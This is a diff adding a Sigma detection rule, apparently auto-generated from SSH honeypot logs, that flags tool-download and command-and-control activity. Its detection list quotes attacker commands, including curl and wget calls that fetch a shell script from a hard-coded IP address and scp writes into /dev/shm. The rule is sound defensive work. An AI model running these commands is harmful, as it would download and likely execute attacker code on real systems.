@@ -1,0 +1,27 @@
+title: Honeypot - SSH Tool Download/C2
+id: fd95910a-efe3-a7c5-fcfd-5c41dda23e91
+status: experimental
+level: critical
+description: Tool download or C2 related commands from SSH honeypot. 7 events, 2 source
+  IPs, 5 unique patterns.
+author: LLM Honeypot Intelligence Platform (automated)
+date: 2026/04/14
+references:
+- https://attack.mitre.org/
+tags:
+- attack.command_and_control
+- attack.t1105
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    CommandLine|contains:
+    - curl ipinfo.io/org
+    - curl -sk https://46.151.182.82/sh
+    - wget --no-check-certificate -qO- https://46.151.182.82/sh
+    - scp -qt "/dev/shm/xOjPSMpn
+    - scp -qt "/dev/shm/irToIbNv
+  condition: selection
+falsepositives:
+- Legitimate system administration
